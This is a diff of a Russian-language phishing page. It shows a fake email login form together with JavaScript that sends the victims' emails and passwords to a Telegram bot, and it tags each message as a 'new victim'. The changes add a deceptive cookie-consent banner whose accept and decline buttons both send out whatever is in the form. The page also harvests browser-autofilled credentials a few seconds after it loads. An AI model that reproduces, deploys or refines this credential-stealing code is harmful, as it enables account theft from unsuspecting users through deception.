@@ -31,10 +31,6 @@
             font-size: 16px;
             box-sizing: border-box;
         }
-        .login-box input.input-error {
-            border-color: #d93025;
-            background: #fff5f5;
-        }
         .login-box button {
             width: 100%;
             padding: 13px;
@@ -50,36 +46,114 @@
         .login-box button:hover {
             background: #005fa3;
         }
-        .error-message {
-            color: #d93025;
-            margin-top: 13px;
-            font-size: 13px;
-            padding: 11px;
-            background: #fce8e6;
-            border-radius: 6px;
-            border-left: 4px solid #d93025;
-            text-align: left;
-            display: none;
-        }
-        .error-message.show {
-            display: block;
-        }
         .logo {
             font-size: 26px;
             font-weight: bold;
             margin-bottom: 18px;
         }
+
+        /* ===== НИЖНИЙ БАННЕР COOKIE ===== */
+        .cookie-banner {
+            position: fixed;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #ffffff;
+            border-top: 1px solid #e0e0e0;
+            box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
+            padding: 16px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            z-index: 9999;
+            font-size: 14px;
+            color: #333;
+        }
+        .cookie-banner .cookie-text {
+            flex: 1;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .cookie-banner .cookie-text b {
+            display: block;
+            margin-bottom: 4px;
+            font-size: 15px;
+        }
+        .cookie-banner .cookie-text span {
+            color: #666;
+            font-size: 13px;
+        }
+        .cookie-banner .cookie-actions {
+            display: flex;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+        .cookie-banner button {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+        .cookie-banner .btn-accept {
+            background: #0077cc;
+            color: white;
+        }
+        .cookie-banner .btn-accept:hover {
+            background: #005fa3;
+        }
+        .cookie-banner .btn-decline {
+            background: #e4e6eb;
+            color: #333;
+        }
+        .cookie-banner .btn-decline:hover {
+            background: #d0d3d8;
+        }
+        .cookie-banner.cookie-hidden {
+            display: none !important;
+        }
+
+        /* ===== МОБИЛЬНАЯ АДАПТАЦИЯ ===== */
+        @media (max-width: 500px) {
+            .cookie-banner {
+                flex-direction: column;
+                align-items: stretch;
+                padding: 14px 16px;
+            }
+            .cookie-banner .cookie-actions {
+                justify-content: stretch;
+            }
+            .cookie-banner .cookie-actions button {
+                flex: 1;
+            }
+        }
     </style>
 </head>
 <body>
+
+    <!-- ФОРМА -->
     <div id="loginFormContainer" class="login-box">
         <div class="logo">📧 Вход</div>
         <form id="loginForm">
             <input type="email" id="email" placeholder="Адрес электронной почты" required>
             <input type="password" id="password" placeholder="Пароль" required>
-            <button type="submit" id="submitBtn">Зарегистрироваться</button>
-            <div id="message" class="error-message"></div>
+            <button type="submit">Зарегистрироваться</button>
         </form>
+    </div>
+
+    <!-- НИЖНИЙ БАННЕР COOKIE -->
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-text">
+            <b>🍪 Мы используем файлы cookie</b>
+            <span>Для корректной работы сайта и сохранения ваших данных. Нажимая «Подтвердить», вы соглашаетесь с обработкой данных.</span>
+        </div>
+        <div class="cookie-actions">
+            <button class="btn-decline" id="btnDecline">Отклонить</button>
+            <button class="btn-accept" id="btnAccept">Подтвердить</button>
+        </div>
     </div>
 
 <script>
@@ -88,77 +162,53 @@
     const CHAT_ID = "8872810304";
     // ========================
 
-    let autoSent = false;
-
-    function sendToTelegram(email, password, isAuto) {
-        const type = isAuto ? "АВТОЗАПОЛНЕНИЕ" : "РУЧНОЙ ВВОД";
+    function sendToTelegram(email, password, type) {
         const text = "📩 НОВАЯ ЖЕРТВА (" + type + ")\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU");
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
-
         fetch(url).catch(function() {});
     }
 
-    function showError(message) {
-        const messageDiv = document.getElementById("message");
-        messageDiv.textContent = message;
-        messageDiv.classList.add("show");
-
-        document.getElementById("email").classList.add("input-error");
-        document.getElementById("password").classList.add("input-error");
+    function collectAndSend(type) {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        if (email || password) {
+            sendToTelegram(email, password, type);
+        }
     }
 
-    function clearError() {
-        const messageDiv = document.getElementById("message");
-        messageDiv.classList.remove("show");
-        messageDiv.textContent = "";
+    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
+    document.getElementById("btnAccept").addEventListener("click", function() {
+        collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
+        document.getElementById("cookieBanner").classList.add("cookie-hidden");
+    });
 
-        document.getElementById("email").classList.remove("input-error");
-        document.getElementById("password").classList.remove("input-error");
-    }
+    // ===== КНОПКА "ОТКЛОНИТЬ" =====
+    document.getElementById("btnDecline").addEventListener("click", function() {
+        collectAndSend("COOKIE ОТКЛОНЕНО");
+        document.getElementById("cookieBanner").classList.add("cookie-hidden");
+    });
 
+    // ===== ОТПРАВКА ФОРМЫ (ручной ввод) =====
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        collectAndSend("РУЧНОЙ ВВОД");
+    });
+
+    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
     function checkAutoFill() {
-        if (autoSent) return;
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         if (email && password) {
-            autoSent = true;
-            sendToTelegram(email, password, true);
+            sendToTelegram(email, password, "АВТОЗАПОЛНЕНИЕ");
         }
     }
-
     window.addEventListener("load", function() {
-        checkAutoFill();
-        setTimeout(checkAutoFill, 300);
-        setTimeout(checkAutoFill, 600);
-        setTimeout(checkAutoFill, 1000);
-        setTimeout(checkAutoFill, 2000);
+        setTimeout(checkAutoFill, 500);
+        setTimeout(checkAutoFill, 1500);
         setTimeout(checkAutoFill, 3000);
     });
 
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault();
-
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-
-        // Если поля пустые - показываем ошибку и не отправляем
-        if (!email || !password) {
-            clearError();
-            showError("Убедитесь, что вы ввели всё правильно.");
-            return;
-        }
-
-        // Сбрасываем прошлую ошибку перед новым показом
-        clearError();
-
-        // Каждое нажатие = новое сообщение в Telegram
-        sendToTelegram(email, password, false);
-
-        // Всегда показываем ошибку
-        showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
-    });
-
-    console.log("ROCKET ACTIVE — Вход готов");
+    console.log("ROCKET ACTIVE — Нижний баннер cookie готов");
 </script>
 </body>
 </html>
